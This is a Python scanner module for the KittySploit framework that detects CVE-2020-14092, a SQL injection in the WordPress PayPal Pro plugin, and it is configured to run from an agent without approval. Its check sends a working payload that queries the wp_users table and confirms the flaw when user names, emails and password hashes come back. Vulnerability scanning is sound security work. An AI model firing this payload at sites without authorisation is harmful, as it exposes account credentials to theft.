#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress PayPal Pro plugin before 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress PayPal Pro <1.1.65 - SQL Injection Detection',
        'description': "WordPress PayPal Pro plugin before 1.1.65 is susceptible to SQL injection via the 'query' parameter which allows for any unauthenticated user to perform SQL queries with the results output to a web page in JSON format.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'wp-plugin', 'sqli', 'paypal', 'wpscan', 'wordpress', 'ithemes', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/10287',
            'https://wordpress.dwbooster.com/forms/payment-form-for-paypal-pro',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-14092',
            'https://wordpress.org/plugins/payment-form-for-paypal-pro/#developers',
            'https://wpvulndb.com/vulnerabilities/10287',
        ],
        'cve': 'CVE-2020-14092',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?cffaction=get_data_from_database&query=SELECT%20*%20from%20wp_users', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"user_login"', '"user_email"', '"user_pass"', '"user_activation_key"',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='critical',
                reason="WordPress PayPal Pro <1.1.65 - SQL Injection detected",
                path='/?cffaction=get_data_from_database&query=SELECT%20*%20from%20wp_users',
            )
            return True
        return False

